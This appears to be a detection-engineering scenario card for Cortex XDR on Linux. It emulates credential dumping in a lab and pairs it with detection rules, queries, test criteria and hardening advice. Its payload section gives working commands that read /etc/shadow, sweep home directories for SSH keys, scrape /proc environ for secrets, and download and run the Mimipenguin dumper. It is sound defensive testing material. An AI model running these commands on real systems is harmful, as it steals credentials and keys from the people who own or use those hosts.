identity.name: Linux Credential Dumping — /etc/shadow and Mimipenguin (T1003.008)
identity.summary: A compromised low-privilege service account enumerates shell users from /etc/passwd, reads /etc/shadow, sweeps home dirs for SSH keys, scrapes /proc/<pid>/environ for in-memory secrets, then runs Mimipenguin to recover cleartext credentials. Cortex XDR for Linux detects each stage via file/process BIOCs plus a stitched credential-harvesting correlation.
identity.description: Linux post-exploitation credential theft is the pivot from a web-app foothold to broader access. In Unit 42's reporting on the Rocke group, operators harvested credentials and SSH keys from compromised Linux hosts to move laterally and disable cloud security agents. This scenario reproduces the canonical Linux credential-dumping chain — passwd/shadow access, filesystem key sweeps, /proc memory scraping, and the Mimipenguin LOLscript — entirely against a single lab host. The detection approach leans on Cortex XDR's Linux file and process telemetry: BIOCs flag a non-root service account touching /etc/shadow and SSH private keys, an analytics module clusters the rapid file-access sequence, and an IOC + correlation rule tie the Mimipenguin download-and-execute to the preceding recon as one credential-access incident.

execution.framework_reference_id: T1003.008 — Atomic Test #1 (Access /etc/shadow) and T1552.001 credential-file sweep

prerequisites.description: Cortex XDR Linux agent installed and reporting healthy on the target.
prerequisites.check_command: systemctl is-active cortex-agent || ps aux | grep -i traps

prerequisites.description: Lab environment matching scenario SIM-EDR-001 requirements (a Linux host with a www-data service account).

payload.code:
# step-1: Read /etc/passwd for user enumeration
cat /etc/passwd | grep -v nologin | grep -v false | grep sh$ && echo '[*] Active shell users enumerated'
# step-2: Attempt to read /etc/shadow
cat /etc/shadow 2>/dev/null || unshadow /etc/passwd /etc/shadow 2>/dev/null || echo '[*] Shadow read attempted'
# step-3: Search filesystem for SSH keys and credential files
find /home -name 'id_rsa' -o -name 'id_ed25519' -o -name '.bash_history' -o -name '.pgpass' -o -name '.my.cnf' 2>/dev/null | head -20
# step-4: Scrape /proc memory for cleartext credentials
for pid in $(ps aux | grep -E 'sshd|apache|nginx|mysql' | grep -v grep | awk '{print $2}' | head -5); do strings /proc/$pid/environ 2>/dev/null | grep -iE 'pass|token|key'; done
# step-5: Download and run Mimipenguin
curl -sSL https://raw.githubusercontent.com/huntergregal/mimipenguin/master/mimipenguin.sh -o /tmp/mimipenguin.sh && chmod +x /tmp/mimipenguin.sh && timeout 30 bash /tmp/mimipenguin.sh

expected_artifacts.description: SSH private key and credential file access during a find sweep.
curl pipe to bash executing mimipenguin.sh.
Outbound HTTPS to raw.githubusercontent.com fetching the tool.

iocs.context: Canonical download URL for the Mimipenguin credential-dumping script. Fetching it on a server is high-fidelity malicious tooling acquisition.
Mimipenguin LOLscript dropped into a writable temp directory before execution.
SHA-256 of the public huntergregal/mimipenguin.sh credential-theft script. Matching this hash is a high-confidence credential-dumping-tool IOC.

biocs.name: EDR-001 Shadow File Read by Non-Root Service Account
biocs.description: Credential file access — /etc/shadow read attempt from non-root service account (www-data). A process not owned by root opens /etc/shadow, the Linux hashed-credential store.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.FILE
| filter action_file_path = "/etc/shadow"
| filter actor_effective_username not in ("root")
| filter actor_process_image_name in ("cat", "unshadow", "head", "less", "more", "dd", "cp", "awk", "python3", "perl")

biocs.name: EDR-001 Broad Credential File Sweep Across Home Directories
biocs.description: Broad credential file search across home directories — SSH key and history file harvesting. A find process enumerates id_rsa/id_ed25519/.bash_history/.pgpass/.my.cnf across /home and /root.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = "find"
| filter action_process_image_command_line contains_any ("id_rsa", "id_ed25519", ".bash_history", ".pgpass", ".my.cnf", ".pem", ".key")
| filter actor_effective_username not in ("root")

biocs.name: EDR-001 Process Memory Scrape via proc environ
biocs.description: Process memory reading via /proc — credential extraction from service process memory spaces. strings/cat reads /proc/<pid>/environ or /proc/<pid>/maps of another service process.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.FILE
| filter action_file_path ~= "/proc/[0-9]+/(environ|maps|mem)"
| filter actor_process_image_name in ("strings", "cat", "dd", "grep", "head", "python3")

biocs.name: EDR-001 Mimipenguin Credential Dumper Execution
biocs.description: Mimipenguin execution — known credential dumping tool signature detected by XDR Agent. bash runs mimipenguin.sh, or a process reads /proc memory immediately after a curl-to-bash fetch.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter action_process_image_command_line contains "mimipenguin"
| filter actor_process_image_name in ("bash", "sh", "curl")

xql_queries.name: EDR-001 Analytics Non-Root Passwd Enumeration
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.FILE and action_file_path = "/etc/passwd"
| filter actor_effective_username not in ("root")
| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_command_line

xql_queries.name: EDR-001 Analytics Unauthorized Shadow Access Pattern
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.FILE and action_file_path = "/etc/shadow"
| filter actor_effective_username != "root"
| comp count() as shadow_reads by agent_hostname, actor_effective_username, actor_process_image_name
| filter shadow_reads >= 1

xql_queries.name: EDR-001 Analytics Recursive Credential File Search
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = "find"
| filter action_process_image_command_line contains_any ("id_rsa", "id_ed25519", ".pgpass", ".my.cnf", ".bash_history")
| fields _time, agent_hostname, actor_effective_username, action_process_image_command_line

xql_queries.name: EDR-001 Analytics Sequential Proc Environ Access
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.FILE and action_file_path ~= "/proc/[0-9]+/environ"
| comp count_distinct(action_file_path) as proc_targets by agent_hostname, actor_process_image_name
| filter proc_targets >= 2

xql_queries.name: EDR-001 Analytics Curl To Bash Credential Tool
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_command_line contains "mimipenguin" or (actor_process_image_name = "curl" and action_process_image_command_line contains "raw.githubusercontent.com")
| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line, causality_actor_process_image_name

correlation_rules.name: Linux Credential Harvesting Chain — passwd/shadow + key sweep + Mimipenguin
correlation_rules.logic: BIOC(EDR-001 Shadow File Read by Non-Root Service Account) OR BIOC(EDR-001 Broad Credential File Sweep Across Home Directories) OR BIOC(EDR-001 Process Memory Scrape via proc environ) OR BIOC(EDR-001 Mimipenguin Credential Dumper Execution)

analytics_modules: Cortex XDR Analytics — Unusual sensitive file access by service account
Cortex XDR Analytics BIOC — Credential access tool execution cluster

products.evidence_query: preset = xdr_data | filter event_type = ENUM.FILE and action_file_path = "/etc/shadow" | fields _time, agent_hostname, actor_effective_username, actor_process_image_name
Correlation rule CR-EDR-0001 groups shadow access + key sweep + Mimipenguin into one credential-access incident.
Playbook isolates host, rotates exposed SSH keys and service-account credentials, opens DFIR ticket.

use_cases.name: Endpoint Credential Theft Detection — Linux
use_cases.description: Detect Linux credential harvesting (passwd/shadow access, SSH key sweeps, /proc scraping, Mimipenguin) by a non-root service account before it enables lateral movement.

test_cases.objective: Cortex XDR BIOCs fire on shadow access and the credential-file sweep from www-data.
preconditions: Cortex XDR Linux agent >= 8.4.0 installed and healthy.
BIOCs from this card imported and enabled.
steps: Observe BIOC alerts in the Cortex console.
success_criteria: BIOC `EDR-001 Shadow File Read by Non-Root Service Account` fires within 60s.
BIOC `EDR-001 Broad Credential File Sweep Across Home Directories` fires within 60s.
Both XQL validation queries return >= 1 row.

test_cases.objective: Mimipenguin download-and-execute is detected and stitched with prior recon.
success_criteria: BIOC `EDR-001 Mimipenguin Credential Dumper Execution` fires.
IOC match on the mimipenguin.sh download URL.
Correlation `CR-EDR-0001` produces a single credential-access incident.

preventive_controls: Restrict /etc/shadow to root:shadow 0640 and audit reads with auditd.
Run web/app services under least-privilege accounts with no shell and no sudo.
Store SSH private keys with passphrases; prefer short-lived certificates.
Block outbound egress from server tiers to public code-hosting unless allowlisted.
detection_engineering: Allowlist legitimate readers of /etc/shadow (e.g., pam, login) and alert on all others.
Hunt for find processes referencing id_rsa/.pgpass and for /proc/*/environ reads by non-owning processes.
Correlate tool-download URLs with subsequent process execution from /tmp.

references.title: Unit42 - Rocke: The Champion of Monero Miners
